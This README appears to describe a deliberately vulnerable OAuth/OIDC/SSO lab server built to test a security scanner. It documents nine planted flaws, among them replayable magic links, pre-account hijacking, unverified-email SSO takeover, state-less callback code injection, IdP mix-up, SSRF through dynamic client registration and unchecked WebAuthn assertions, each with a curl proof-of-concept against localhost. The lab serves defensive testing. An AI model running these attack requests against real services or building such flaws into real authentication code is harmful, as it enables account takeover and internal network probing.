# oauth-lab — Vulnerable OAuth / OIDC / SSO Lab Target

A deliberately vulnerable identity deployment for the Dark Matter
scanner. **Lab only** — it exists so the 9 OAuth/OIDC/SSO checklist
rows from the beyond-478 scout (**#487–#493, #497, #502**) can be
tested on our own infrastructure. No current lab exposes a magic-link
flow, an OAuth authorization server, OIDC dynamic registration, a
refresh-token flow or WebAuthn, so those rows were unprovable until
this lab.

## What it is

A **deterministic stub IdP + relying party in one server**:
`server.js` is Node stdlib only (no npm dependencies, no external
IdP, no real email, $0 spend). Both IdPs are namespaces in this
server; magic links are returned in the API response instead of being
emailed; the `email` parameter on `/oauth/authorize` is the simulated
IdP session (in a real deployment the user would authenticate at the
IdP in their browser — this lab has no IdP login page, so the caller
names the IdP identity the flow runs as). The planted flaws are in
what the relying party does with the result, not in the simulation.

- **Port:** 3620 (container listens on `0.0.0.0:3620`)
- **IdPs:** `idp-acme` (the control — verifies email) and
  `idp-quick` (planted — never verifies email)
- **Seeded login:** `lab-user@example.com` / `lab-pass`
  (fake fixture, same convention as coupon-lab), pre-registered at
  both IdPs — verified at `idp-acme`, usable-unverified at
  `idp-quick`
- **Tokens:** deterministic counter-derived fake strings
  (`ml-0001-…`, `st-…`, `code-…`, `at-…`, `rt-…`, `sess-…`) — no
  randomness, no real secrets. A restart resets all state.

## Run it

Locally (no Docker needed):

```bash
cd labs/oauth-lab
node server.js          # → listening on 0.0.0.0:3620
```

On EC2 (parent deploys — see "Deploy" below):

```bash
docker build -t oauth-lab labs/oauth-lab
docker run -d --name oauth-lab --restart unless-stopped \
  -p 172.17.0.1:3620:3620 oauth-lab
```

## Endpoints

| Endpoint | Method | Purpose |
|---|---|---|
| `/` | GET | Index page (HTML mining surface) |
| `/health` | GET | Liveness: `{"ok":true,"service":"oauth-lab",...}` |
| `/api/routes` | GET | JSON list of all routes |
| `/api/users` | GET | Users + linked identities (no passwords) |
| `/api/admin/fetch-log` | GET | Server-side fetch attempts (SSRF observable) |
| `/.well-known/openid-configuration?idp=<id>` | GET | OIDC discovery per IdP |
| `/idp/:idp/.well-known/openid-configuration` | GET | Same, path form |
| `/api/auth/register` | POST | Open registration — `{email, password}` |
| `/api/auth/login` | POST | Password login → `{sessionToken}` |
| `/api/auth/magic-link` | POST | `{email}` → `{token, magicLink}` |
| `/api/auth/magic-link/redeem` | GET/POST | `?token=…` → `{sessionToken, tokenKind, redeemedCount}` |
| `/api/auth/me` | GET | `Authorization: Bearer <session>` → account |
| `/idp/:idp/register` | POST | Register an identity at an IdP |
| `/idp/idp-acme/verify` | POST | `{email, code}` — verify at the control IdP |
| `/oauth/authorize` | GET | `?response_type=code&client_id=…&redirect_uri=…&idp=…&email=…&state=…` → `{code, state, redirect}` |
| `/oauth/token` | POST | `{grant_type:"authorization_code", code}` or `{grant_type:"refresh_token", refresh_token}` |
| `/oauth/callback` | GET | `?code=…&state=…` — login callback → `{sessionToken}` |
| `/oauth/link` | POST | `{code}` + session → links the OAuth identity to the session |
| `/oauth/register` | POST | Dynamic client registration (RFC 7591) |
| `/webauthn/register/begin` | POST | `{email}` → `{challenge}` |
| `/webauthn/register/finish` | POST | `{email, credentialId, publicKey, challenge}` |
| `/webauthn/authenticate/begin` | POST | `{email}` → `{challenge, allowCredentials}` |
| `/webauthn/authenticate/finish` | POST | `{email, credentialId, challenge, origin, signature}` → `{sessionToken}` |

## Planted vulnerabilities

Every planted behaviour below is intentional and documented. All
accounts, passwords and tokens are **FAKE fixtures** (the
`lab-user` / `lab-pass` convention; tokens are counter-derived
strings, never real credentials).

### 1. Magic-link token flaws — row #487 [High, CWE-307 / CWE-798]

- Tokens **never expire** (`expiresIn: null`) and are **not
  single-use** — redeeming the same token twice returns a fresh
  session both times (`redeemedCount` increments).
- The redeem endpoint looks the token up in a **unified token
  store** that also holds OAuth `state` values, so a `state` value
  issued by `/oauth/authorize` is **redeemable as a magic link**
  (CVE-2026-114607 shape — the response reports
  `tokenKind: "oauth-state"`).

```bash
B=http://localhost:3620
T=$(curl -s -X POST $B/api/auth/magic-link -H 'content-type: application/json' \
  -d '{"email":"lab-user@example.com"}' | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')
curl -s "$B/api/auth/magic-link/redeem?token=$T"   # → 200, sessionToken
curl -s "$B/api/auth/magic-link/redeem?token=$T"   # → 200 AGAIN (replay, redeemedCount 2)
# state as magic link:
S=$(curl -s "$B/oauth/authorize?response_type=code&client_id=lab-client&redirect_uri=$B/oauth/callback&idp=idp-acme&email=lab-user@example.com" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["state"])')
curl -s "$B/api/auth/magic-link/redeem?token=$S"   # → 200, tokenKind "oauth-state"
```

### 2. Pre-account hijacking — row #488 [High, CWE-287]

Registration is open and **no email verification step exists** —
an account is live the moment it is registered. An attacker
registers the victim's email with an attacker password; when the
victim later signs in via magic link, the account is simply
completed, and the **attacker's password still works**.

```bash
B=http://localhost:3620
curl -s -X POST $B/api/auth/register -H 'content-type: application/json' \
  -d '{"email":"victim@example.com","password":"attacker-pass"}'   # → 201, verified false
T=$(curl -s -X POST $B/api/auth/magic-link -H 'content-type: application/json' \
  -d '{"email":"victim@example.com"}' | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')
curl -s "$B/api/auth/magic-link/redeem?token=$T"                  # victim "signs in"
curl -s -X POST $B/api/auth/login -H 'content-type: application/json' \
  -d '{"email":"victim@example.com","password":"attacker-pass"}'  # → 200 (hijack: attacker password still works)
```

### 3. SSO takeover via unverified email at the IdP — row #489 [High, CWE-287]

`idp-quick` **never verifies email** — any address registers and
is immediately usable as an OAuth identity — and the relying party
trusts the IdP's email claim regardless (`email_verified: false`
in the id_token is ignored). `idp-acme` is the control: it issues
a verification code and `/oauth/authorize` refuses unverified
identities there.

```bash
B=http://localhost:3620
curl -s -X POST $B/idp/idp-quick/register -H 'content-type: application/json' \
  -d '{"email":"victim@example.com","password":"attacker-pass"}'  # → 201, no verification step
C=$(curl -s "$B/oauth/authorize?response_type=code&client_id=lab-client&redirect_uri=$B/oauth/callback&idp=idp-quick&email=victim@example.com" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["code"])')
curl -s "$B/oauth/callback?code=$C"   # → 200, session for victim@example.com
```

### 4. Forced profile linking — row #490 [High, CWE-352]

`POST /oauth/link` has **no CSRF token and no state check** — any
valid code links that OAuth identity to whoever's session calls
it. An attacker code + a victim session links the attacker's
social account to the victim.

```bash
B=http://localhost:3620
# victim session:
V=$(curl -s -X POST $B/api/auth/login -H 'content-type: application/json' \
  -d '{"email":"lab-user@example.com","password":"lab-pass"}' | python3 -c 'import json,sys; print(json.load(sys.stdin)["sessionToken"])')
# attacker code (attacker identity at idp-quick):
curl -s -X POST $B/idp/idp-quick/register -H 'content-type: application/json' \
  -d '{"email":"attacker@example.com","password":"attacker-pass"}' >/dev/null
C=$(curl -s "$B/oauth/authorize?response_type=code&client_id=lab-client&redirect_uri=$B/oauth/callback&idp=idp-quick&email=attacker@example.com" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["code"])')
curl -s -X POST $B/oauth/link -H 'content-type: application/json' -H "Authorization: Bearer $V" \
  -d "{\"code\":\"$C\"}"   # → 200, lab-user now has attacker@example.com linked (GET /api/users to confirm)
```

### 5. Authorization-code injection — row #491 [High, CWE-352]

`GET /oauth/callback` **never validates `state`** — no state is
stored for comparison, any value (including none) is accepted.
An attacker-obtained code therefore logs the caller in as the
code's owner. If the caller arrives with an existing session, the
callback **overwrites that session** to the code owner's identity
— the victim's session token then resolves to the attacker via
`GET /api/auth/me`.

```bash
B=http://localhost:3620
V=$(curl -s -X POST $B/api/auth/login -H 'content-type: application/json' \
  -d '{"email":"lab-user@example.com","password":"lab-pass"}' | python3 -c 'import json,sys; print(json.load(sys.stdin)["sessionToken"])')
C=$(curl -s "$B/oauth/authorize?response_type=code&client_id=lab-client&redirect_uri=$B/oauth/callback&idp=idp-quick&email=attacker@example.com" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["code"])')
curl -s "$B/oauth/callback?code=$C&state=bogus-state&session=$V"  # → 200, session $V is now attacker@example.com
curl -s "$B/api/auth/me?session=$V"                               # → email attacker@example.com
```

### 6. Authorization-server mix-up (IdP confusion) — row #492 [High, CWE-346]

The token endpoint redeems a code from **any IdP** and the
id_token's `iss` is whatever IdP issued the code; the relying
party **never validates `iss`** against the IdP the flow started
with (both endpoints report `issuerValidated: false`). A flow
started against `idp-acme` can therefore be completed with a code
minted at `idp-quick`, and the RP treats it as a valid login.

```bash
B=http://localhost:3620
C=$(curl -s "$B/oauth/authorize?response_type=code&client_id=lab-client&redirect_uri=$B/oauth/callback&idp=idp-quick&email=attacker@example.com" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["code"])')
curl -s -X POST $B/oauth/token -H 'content-type: application/json' \
  -d "{\"grant_type\":\"authorization_code\",\"code\":\"$C\",\"client_id\":\"lab-client\"}"
# → 200, issued_by_idp "idp-quick", issuer_validated false, id_token iss .../idp/idp-quick
```

### 7. SSRF via OIDC dynamic client registration — row #493 [High, CWE-918]

`POST /oauth/register` is **open** (no authentication) and the
server **fetches `jwks_uri` and `logo_uri` server-side**
(2 s timeout, 8 KB cap, no redirects). Every attempt is logged
to `GET /api/admin/fetch-log` — the probe's observable (the
target listener receives the hit, and the log records
`{url, status, bytes}`).

```bash
B=http://localhost:3620
curl -s -X POST $B/oauth/register -H 'content-type: application/json' \
  -d '{"client_name":"lab","redirect_uris":["http://localhost/cb"],"jwks_uri":"http://172.17.0.1:3000/.well-known/jwks.json","logo_uri":"http://172.17.0.1:3000/logo.png"}'
# → 201, fetched[] shows the server-side GETs; GET /api/admin/fetch-log confirms them
```

### 8. Refresh-token reuse / missing rotation — row #497 [Medium, CWE-307]

The refresh-token grant **never rotates** the refresh token and
**never revokes on reuse** — the same token works again and again
(the response reports `rotated: false` and an incrementing
`refreshReuseCount`).

```bash
B=http://localhost:3620
R=$(curl -s -X POST $B/oauth/token -H 'content-type: application/json' \
  -d "{\"grant_type\":\"authorization_code\",\"code\":\"$C\"}" | python3 -c 'import json,sys; print(json.load(sys.stdin)["refresh_token"])')
curl -s -X POST $B/oauth/token -H 'content-type: application/json' \
  -d "{\"grant_type\":\"refresh_token\",\"refresh_token\":\"$R\"}"   # → 200, refreshReuseCount 1
curl -s -X POST $B/oauth/token -H 'content-type: application/json' \
  -d "{\"grant_type\":\"refresh_token\",\"refresh_token\":\"$R\"}"   # → 200 AGAIN, refreshReuseCount 2
```

### 9. WebAuthn origin / challenge validation missing — row #502 [High, CWE-347]

The `finish` endpoints check **nothing**: any challenge (stale,
wrong, never issued), any origin, no signature verification, no
signature-counter check. The response says so explicitly
(`originChecked: false, challengeChecked: false,
signatureChecked: false, signCountChecked: false`).

```bash
B=http://localhost:3620
curl -s -X POST $B/webauthn/register/begin -H 'content-type: application/json' \
  -d '{"email":"lab-user@example.com"}' >/dev/null
curl -s -X POST $B/webauthn/register/finish -H 'content-type: application/json' \
  -d '{"email":"lab-user@example.com","credentialId":"cred-lab-1","publicKey":"lab-fake-key","challenge":"never-issued-challenge"}'
# → 200, challengeChecked false
curl -s -X POST $B/webauthn/authenticate/finish -H 'content-type: application/json' \
  -d '{"email":"lab-user@example.com","credentialId":"cred-lab-1","challenge":"stale-challenge","origin":"https://evil.example.com","signature":"lab-fake-sig"}'
# → 200, sessionToken, originAccepted "https://evil.example.com"
```

## Coverage of the 9 OAuth rows

| Rows | Status | Note |
|---|---|---|
| #487 | Planted (§1) | Non-expiring, replayable magic link; OAuth state redeemable as magic link |
| #488 | Planted (§2) | Open registration, no verification; attacker password survives victim magic-link sign-in |
| #489 | Planted (§3) | `idp-quick` never verifies email; RP trusts the claim (`email_verified: false` ignored) |
| #490 | Planted (§4) | `/oauth/link` — no CSRF, no state; attacker code links into victim session |
| #491 | Planted (§5) | `/oauth/callback` — state never validated; session overwritten to code owner |
| #492 | Planted (§6) | Any-IdP code redeems; `iss` never validated (`issuerValidated: false`) |
| #493 | Planted (§7) | Open dynamic registration fetches `jwks_uri` / `logo_uri` server-side; fetch log observable |
| #497 | Planted (§8) | Refresh token never rotated, never revoked on reuse (`refreshReuseCount`) |
| #502 | Planted (§9) | WebAuthn finish accepts any challenge / origin; no signature or counter check |

All 9 rows have a live planted surface. (The lab does not cover
#494–#496 — Host/Referer SSRF and Referer-based access control —
which need a host-routing lab; those stay in Tier B.)

## Safety rails (non-negotiable)

- **No real email**: magic links are returned in the API response.
  Nothing is sent anywhere.
- **No external IdP**: both IdPs are namespaces in this server.
- **All accounts / passwords / tokens are FAKE fixtures** built
  by the `lab-user` / `lab-pass` convention and counter-derived
  token strings. No real credential exists anywhere in this lab.
- **The one server-side fetch refuses the EC2 instance-metadata
  address** `169.254.169.254` (logged as `blocked-metadata-ip`) —
  a probe must not be able to reach cloud credentials through this
  lab. The intended SSRF target surface is the other labs on the
  bridge network (`172.17.0.1:<port>`).
- **No `child_process`, no shell, no `eval`** anywhere in
  `server.js`. The fetch uses only `http`/`https` GET with a 2 s
  timeout, an 8 KB cap and no redirect following.
- **Container binds `0.0.0.0:3620` only inside its own
  container**; on EC2 the port is published on `172.17.0.1` (the
  lab bridge network), never on the public interface — same
  pattern as the other labs.
- **No destructive reach**: all state is in-memory in this
  process (re-seeded on restart). Nothing on the host or in other
  labs is reachable from this app except through the documented
  SSRF fetch surface above.

## Deploy (parent)

The lab is **not** deployed by this lane. To deploy on EC2:

1. Add a service to `docker/labs-compose.yml` (same shape as
   `lab-xxe`): `oauth-lab`, image built from `labs/oauth-lab`,
   container `oauth-lab`, `172.17.0.1:3620:3620`,
   `restart: unless-stopped`.
2. Add `3620` to the backend's `LAB_TARGETS` so scanner hunts can
   use it (same step as llm-lab's 3600 / coupon-lab's 3610).
3. Verify: `curl http://172.17.0.1:3620/health` →
   `{"ok":true,...}`.

## Smoke tests (lane, local sandbox)

Run `node server.js`, then curl each endpoint — see the lane
report for the exact commands and outputs. Expected: health
`{"ok":true,"service":"oauth-lab"}`; magic-link redeem works
twice; an OAuth `state` redeems as a magic link
(`tokenKind: "oauth-state"`); open registration + magic-link
sign-in leaves the attacker password working; `idp-quick`
registers an unverified identity and its code logs in; the
callback accepts a bogus `state` and overwrites the caller's
session; the token endpoint redeems an `idp-quick` code with
`issuerValidated: false`; dynamic registration fetches the given
`jwks_uri` (visible in `/api/admin/fetch-log`) and refuses
`169.254.169.254`; a refresh token works twice with
`refreshReuseCount` 1 then 2; a WebAuthn finish with a stale
challenge and `https://evil.example.com` origin returns a session.
